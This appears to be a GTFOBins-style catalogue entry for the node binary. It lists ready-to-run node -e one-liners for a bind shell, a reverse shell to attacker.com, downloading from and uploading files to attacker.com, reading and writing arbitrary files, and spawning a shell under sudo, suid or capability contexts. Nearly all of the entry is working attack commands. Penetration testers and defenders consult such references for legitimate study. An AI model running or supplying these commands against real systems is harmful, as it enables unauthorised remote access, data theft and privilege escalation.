---
type: gtfobin
name: node
platform: Unix
functions: [bind-shell, download, file-read, file-write, reverse-shell, shell, upload]
tags: [gtfobin, unix, lotl]
---

# node

## bind-shell

```bash
node -e 'sh = require("child_process").spawn("/bin/sh");
require("net").createServer(function (client) {
  client.pipe(sh.stdin);
  sh.stdout.pipe(client);
  sh.stderr.pipe(client);
}).listen(12345)'
```
**Contexts:** sudo, suid, unprivileged

## download

```bash
node -e 'require("http").get("http://attacker.com/path/to/input-file", res => res.pipe(require("fs").createWriteStream("/path/to/output-file")))'
```
**Contexts:** sudo, suid, unprivileged

## file-read

```bash
node -e 'process.stdout.write(require("fs").readFileSync("/path/to/input-file"))'
```
**Contexts:** sudo, suid, unprivileged

## file-write

```bash
node -e 'require("fs").writeFileSync("/path/to/output-file", "DATA")'
```
**Contexts:** sudo, suid, unprivileged

## reverse-shell

```bash
node -e 'sh = require("child_process").spawn("/bin/sh");
require("net").connect(12345, "attacker.com", function () {
  this.pipe(sh.stdin);
  sh.stdout.pipe(this);
  sh.stderr.pipe(this);
})'
```
**Contexts:** sudo, suid, unprivileged

## shell

```bash
node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
```
**Contexts:** capabilities, sudo, suid, unprivileged

## upload

```bash
node -e 'require("fs").createReadStream("/path/to/input-file").pipe(require("http").request("http://attacker.com/path/to/output-file"))'
```
**Contexts:** sudo, suid, unprivileged
